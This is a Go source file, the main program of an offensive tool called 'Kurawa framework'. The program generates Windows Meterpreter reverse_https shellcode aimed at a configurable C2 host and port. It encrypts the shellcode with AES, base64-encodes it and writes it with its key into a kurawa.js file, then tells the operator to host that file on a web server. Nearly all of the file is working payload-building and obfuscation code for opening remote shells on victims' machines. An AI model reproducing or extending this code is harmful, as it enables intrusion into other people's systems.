package main

import (
	b64 "encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	shellcode "kurawa/shellcode"
	"os"
)

var (
	listener  = flag.String("listen", "windows/meterpreter/reverse_https", "Payload handler")
	lhost     = flag.String("lhost", "127.0.0.1", "Ip Address for c2 server")
	lport     = flag.String("lport", "443", "Port binding for c2 server")
	iteration = flag.String("i", "5", "Shellcode iteration")
	key       = flag.String("key", "1234567812345678", "key for enc or dec shellcode")
	//file      = flag.String("file", "/tmp/shellcode", "location file shellcode with hex format")
)

type Payload struct {
	Data string `json:"data"`
	Pass string `json:"pass"`
}

func main() {
	fmt.Println("[+] Kurawa framework v.0.0.1")
	flag.Parse()
	keyLen := len(*key)
	if keyLen > 0 && keyLen != 16 && keyLen != 24 && keyLen != 32 {
		fmt.Println("not a valid key. lenght should be 16, 24 or 32")
		return
	}

	shellcode.CreateShellcode(*listener, *lhost, *lport, *iteration)

	isKey := []byte(*key)
	data, err := ioutil.ReadFile("/tmp/shellcode")
	if err != nil {
		fmt.Println("[!] Error read shellcode file, Please use -file options")
		return
	}
	payload := []byte(data)
	sEnc, err := shellcode.Encrypt(isKey, payload)
	if err != nil {
		fmt.Println(err)
	}

	b64Enc := b64.StdEncoding.EncodeToString(sEnc)
	fmt.Println("[+] Enc shellcode with AES with key ", *key)

	file := Payload{
		Data: b64Enc,
		Pass: *key,
	}

	fmt.Println("[+] Create file kurawa.js")
	jsonFile, err := os.Create("output/kurawa.js")
	if err != nil {
		fmt.Println("[!] Error creating JS file:", err)
		return
	}
	jsonWriter := io.Writer(jsonFile)
	encoder := json.NewEncoder(jsonWriter)
	err = encoder.Encode(&file)
	if err != nil {
		fmt.Println("[!] Error encoding JS to file:", err)
		return
	}

	fmt.Println("[+] Please hosting file kurawa.js to web server")
	fmt.Println("[+] ==========================================================")

}
